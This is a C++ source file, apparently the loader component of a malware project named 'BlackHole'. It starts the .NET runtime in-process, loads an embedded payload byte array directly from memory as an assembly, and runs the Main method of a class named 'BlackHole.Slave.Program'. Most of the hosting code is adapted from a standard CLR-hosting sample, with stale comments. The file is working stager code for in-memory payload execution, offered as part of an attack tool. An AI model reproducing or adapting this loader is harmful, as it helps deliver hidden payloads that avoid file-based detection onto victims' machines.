// BlackHole.Loader.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Payload.h"

#include <metahost.h> 
#pragma comment(lib, "mscoree.lib") 

// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library). 
#import "mscorlib.tlb" raw_interfaces_only                
using namespace mscorlib;

HRESULT LoadPayload(PCWSTR pszVersion, LPBYTE buffer, ULONG size, PCWSTR pszClassName);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	LoadPayload(L"v4.0.30319", RawData, Payload::RawSize, TEXT("BlackHole.Slave.Program"));
	return EXIT_SUCCESS;
}

HRESULT LoadPayload(PCWSTR pszVersion, LPBYTE buffer, ULONG size, PCWSTR pszClassName)
{
	HRESULT hr;

	ICLRMetaHost *pMetaHost = NULL;
	ICLRRuntimeInfo *pRuntimeInfo = NULL;

	// ICorRuntimeHost and ICLRRuntimeHost are the two CLR hosting interfaces 
	// supported by CLR 4.0. Here we demo the ICorRuntimeHost interface that  
	// was provided in .NET v1.x, and is compatible with all .NET Frameworks.  
	ICorRuntimeHost *pCorRuntimeHost = NULL;

	IUnknownPtr spAppDomainThunk = NULL;
	_AppDomainPtr spDefaultAppDomain = NULL;

	// The .NET assembly to load. 
	_AssemblyPtr spAssembly = NULL;

	// The .NET class to instantiate. 
	bstr_t bstrClassName(pszClassName);
	_TypePtr spType = NULL;
	variant_t vtObject;
	variant_t vtEmpty;

	// The static method in the .NET class to invoke. 
	bstr_t bstrStaticMethodName(L"Main");
	SAFEARRAY *psaStaticMethodArgs = NULL;
	variant_t vtStringArg(L"HelloWorld");
	variant_t vtStringArrayArgs;
	variant_t vtLengthRet;
	
	// let's create an OLEAUT's SAFEARRAY of BYTEs and copy the buffer into it
	// TODO: add some error checking here (mostly for out of memory errors)
	SAFEARRAYBOUND bounds = { size, 0 };
	SAFEARRAY *psa = SafeArrayCreate(VT_UI1, 1, &bounds);
	void* data;
	SafeArrayAccessData(psa, &data);
	CopyMemory(data, buffer, size);
	SafeArrayUnaccessData(psa);

	//  
	// Load and start the .NET runtime. 
	//  

	wprintf(L"Load and start the .NET runtime %s \n", pszVersion);

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
	if (FAILED(hr))
	{
		wprintf(L"CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Get the ICLRRuntimeInfo corresponding to a particular CLR version. It  
	// supersedes CorBindToRuntimeEx with STARTUP_LOADER_SAFEMODE. 
	hr = pMetaHost->GetRuntime(pszVersion, IID_PPV_ARGS(&pRuntimeInfo));
	if (FAILED(hr))
	{
		wprintf(L"ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Check if the specified runtime can be loaded into the process. This  
	// method will take into account other runtimes that may already be  
	// loaded into the process and set pbLoadable to TRUE if this runtime can  
	// be loaded in an in-process side-by-side fashion.  
	BOOL fLoadable;
	hr = pRuntimeInfo->IsLoadable(&fLoadable);
	if (FAILED(hr))
	{
		wprintf(L"ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	if (!fLoadable)
	{
		wprintf(L".NET runtime %s cannot be loaded\n", pszVersion);
		goto Cleanup;
	}

	// Load the CLR into the current process and return a runtime interface  
	// pointer. ICorRuntimeHost and ICLRRuntimeHost are the two CLR hosting   
	// interfaces supported by CLR 4.0. Here we demo the ICorRuntimeHost  
	// interface that was provided in .NET v1.x, and is compatible with all  
	// .NET Frameworks.  
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost,
		IID_PPV_ARGS(&pCorRuntimeHost));
	if (FAILED(hr))
	{
		wprintf(L"ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Start the CLR. 
	hr = pCorRuntimeHost->Start();
	if (FAILED(hr))
	{
		wprintf(L"CLR failed to start w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	//  
	// Load the NET assembly. Call the static method GetStringLength of the  
	// class CSSimpleObject. Instantiate the class CSSimpleObject and call  
	// its instance method ToString. 
	//  

	// The following C++ code does the same thing as this C# code: 
	//  
	//   Assembly assembly = AppDomain.CurrentDomain.Load(pszAssemblyName); 
	//   object length = type.InvokeMember("GetStringLength",  
	//       BindingFlags.InvokeMethod | BindingFlags.Static |  
	//       BindingFlags.Public, null, null, new object[] { "HelloWorld" }); 
	//   object obj = assembly.CreateInstance("CSClassLibrary.CSSimpleObject"); 
	//   object str = type.InvokeMember("ToString",  
	//       BindingFlags.InvokeMethod | BindingFlags.Instance |  
	//       BindingFlags.Public, null, obj, new object[] { }); 

	// Get a pointer to the default AppDomain in the CLR. 
	hr = pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk);
	if (FAILED(hr))
	{
		wprintf(L"ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));
	if (FAILED(hr))
	{
		wprintf(L"Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Load the .NET assembly. 
	//wprintf(L"Load the assembly %s\n", pszAssemblyName);
	//hr = spDefaultAppDomain->Load_2(bstrAssemblyName, &spAssembly);
	//if (FAILED(hr))
	//{
	//	wprintf(L"Failed to load the assembly w/hr 0x%08lx\n", hr);
	//	goto Cleanup;
	//}

	hr = spDefaultAppDomain->Load_3(psa, &spAssembly);
	if (FAILED(hr))
	{
		wprintf(L"Failed to load the assembly w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = spAssembly->GetType_2(bstrClassName, &spType);
	if (FAILED(hr))
	{
		wprintf(L"Failed to get the Type interface w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Create a safe array to contain the arguments of the method. The safe  
	// array must be created with vt = VT_VARIANT because .NET reflection  
	// expects an array of Object - VT_VARIANT. There is only one argument,  
	// so cElements = 1. 
	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	LONG index = 0;
	hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArrayArgs);
	if (FAILED(hr))
	{
		wprintf(L"SafeArrayPutElement failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(
		BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
		NULL, vtEmpty, psaStaticMethodArgs, &vtLengthRet);
	if (FAILED(hr))
	{
		wprintf(L"Failed to invoke GetStringLength w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Print the call result of the static method. 
	wprintf(L"Call %s.%s(\"%s\") => %d\n",
		static_cast<PCWSTR>(bstrClassName),
		static_cast<PCWSTR>(bstrStaticMethodName),
		static_cast<PCWSTR>(vtStringArg.bstrVal),
		vtLengthRet.lVal);

	// Instantiate the class. 
	hr = spAssembly->CreateInstance(bstrClassName, &vtObject);
	if (FAILED(hr))
	{
		wprintf(L"Assembly::CreateInstance failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

Cleanup:
	SafeArrayDestroy(psa); // don't forget to destroy
	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}
	if (pCorRuntimeHost)
	{
		// Please note that after a call to Stop, the CLR cannot be  
		// reinitialized into the same process. This step is usually not  
		// necessary. You can leave the .NET runtime loaded in your process. 
		//wprintf(L"Stop the .NET runtime\n"); 
		//pCorRuntimeHost->Stop(); 

		pCorRuntimeHost->Release();
		pCorRuntimeHost = NULL;
	}

	if (psaStaticMethodArgs)
	{
		SafeArrayDestroy(psaStaticMethodArgs);
		psaStaticMethodArgs = NULL;
	}
	return hr;
}